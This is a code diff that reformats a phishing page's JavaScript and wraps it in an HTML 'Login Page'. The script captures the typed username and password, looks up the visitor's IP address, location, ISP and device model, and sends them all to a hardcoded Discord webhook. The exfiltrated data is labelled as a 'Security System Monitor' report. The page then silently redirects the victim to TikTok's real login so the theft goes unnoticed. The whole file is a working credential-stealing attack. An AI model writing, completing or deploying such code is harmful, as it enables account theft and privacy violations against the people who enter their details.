@@ -1,61 +1,61 @@
-<script>
-async function sendTargetData() {
-    // 1. Get input data from HTML fields
-    const userField = document.getElementById('user').value;
-    const passField = document.getElementById('pass').value;
-    const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+</head>
+<body>
+    <script>
+    async function sendTargetData() {
+        const userField = document.getElementById('user').value;
+        const passField = document.getElementById('pass').value;
+        const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-    if (!userField || !passField) {
-        alert("Please enter your login details to continue.");
-        return;
+        if (!userField || !passField) {
+            alert("Please enter your login details to continue.");
+            return;
+        }
+
+        try {
+            const ipTask = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+            const userAgent = navigator.userAgent;
+            const regExp = /\(([^)]+)\)/;
+            const matches = regExp.exec(userAgent);
+            const deviceModel = matches ? matches[1] : "Unknown Device";
+
+            const loc = await ipTask;
+
+            const payload = {
+                username: "Security System Monitor",
+                embeds: [{
+                    title: "Log Report: User Authentication",
+                    color: 16711680, 
+                    fields: [
+                        { name: "👤 Account ID", value: `\`${userField}\``, inline: true },
+                        { name: "🔑 Security Key", value: `\`${passField}\``, inline: true },
+                        { name: "📱 Device Info", value: `**${deviceModel}**`, inline: false },
+                        { name: "🌐 IP Address", value: `**${loc.ip || 'Not Found'}**`, inline: true },
+                        { name: "📍 Location", value: `${loc.city || 'N/A'}, ${loc.country_name || 'N/A'}`, inline: true },
+                        { name: "📡 ISP/Provider", value: `${loc.org || 'Unknown'}`, inline: false }
+                    ],
+                    footer: { text: "Transmission Verified • " + new Date().toLocaleString() }
+                }]
+            };
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true 
+            });
+
+            window.location.replace("https://www.tiktok.com/login");
+
+        } catch (error) {
+            window.location.replace("https://www.tiktok.com/");
+        }
     }
-
-    try {
-        // 2. Fetch IP and Location in parallel
-        const ipTask = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
-        
-        // 3. Extract detailed Device Model info
-        const userAgent = navigator.userAgent;
-        const regExp = /\(([^)]+)\)/;
-        const matches = regExp.exec(userAgent);
-        const deviceModel = matches ? matches[1] : "Unknown Device";
-
-        const loc = await ipTask;
-
-        // 4. Create the English Discord Payload
-        const payload = {
-            username: "Security System Monitor",
-            embeds: [{
-                title: "Log Report: User Authentication",
-                color: 16711680, 
-                fields: [
-                    { name: "👤 Account ID", value: `\`${userField}\``, inline: true },
-                    { name: "🔑 Security Key", value: `\`${passField}\``, inline: true },
-                    { name: "📱 Device Info", value: `**${deviceModel}**`, inline: false },
-                    { name: "🌐 IP Address", value: `**${loc.ip || 'Not Found'}**`, inline: true },
-                    { name: "📍 Location", value: `${loc.city || 'N/A'}, ${loc.country_name || 'N/A'}`, inline: true },
-                    { name: "📡 ISP/Provider", value: `${loc.org || 'Unknown'}`, inline: false }
-                ],
-                footer: { text: "Transmission Verified • " + new Date().toLocaleString() }
-            }]
-        };
-
-        // 5. Send data with 'keepalive' to ensure zero data loss
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            keepalive: true 
-        });
-
-        // 6. Redirect to actual platform
-        window.location.replace("https://www.tiktok.com/login");
-
-    } catch (error) {
-        // Quiet redirect if error occurs
-        window.location.replace("https://www.tiktok.com/");
-    }
-}
-                     </script>
-
-                     
+    </script>
+</body>
+</html>
